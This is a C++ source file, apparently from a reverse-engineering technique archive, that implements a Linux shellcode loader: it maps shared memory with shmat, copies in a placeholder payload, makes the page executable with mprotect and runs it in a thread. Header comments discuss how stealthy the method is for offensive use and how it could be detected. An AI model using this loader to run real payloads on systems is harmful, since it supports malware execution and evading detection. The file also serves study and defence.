/*
    Shellcode Loader
    Archive of Reversing.ID

    allocate memory with shmat

Compile:
    $ g++ code.cpp -pthread

Technique:
    - allocation: shmat
    - writing:    memcpy
    - permission: mprotect
    - execution:  pthread_create

Note:
    - shared memory segment is not stealthiest for offensive use
    - overkill for local shellcode
    - pros:
        - can be used for IPC/shared shellcode
        - allows RX permission
    - cons:
        - ipcs, /dev/shm, or memory inspection can spot the segment
*/

#include <stdlib.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

typedef void* (*thread_entrypoint)(void*);

int main ()
{
    void *      runtime;
    int         retval;
    pthread_t   th_shellcode;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;
    size_t      pagesize    = getpagesize();
    int         shmid;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    // allocated size need to be page-aligned
    // optional: if shmget failed, shmid will be -1
    shmid = shmget(IPC_PRIVATE, pagesize, IPC_CREAT | 0600);
    
    // optional: if shmat failed, it will return -1
    runtime = shmat(shmid, NULL, 0);

    // copy payload to the buffer
    memcpy (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = mprotect (runtime, payload_len, PROT_READ|PROT_EXEC);

    if (retval == 0)
    {
        // execute as new thread
        pthread_create (&th_shellcode, NULL, (thread_entrypoint)runtime, NULL);
        pthread_join (th_shellcode, NULL);
    }

    // detach and remove the shared memory 
    shmdt (runtime);
    shmctl (shmid, IPC_RMID, NULL);

    return 0;
}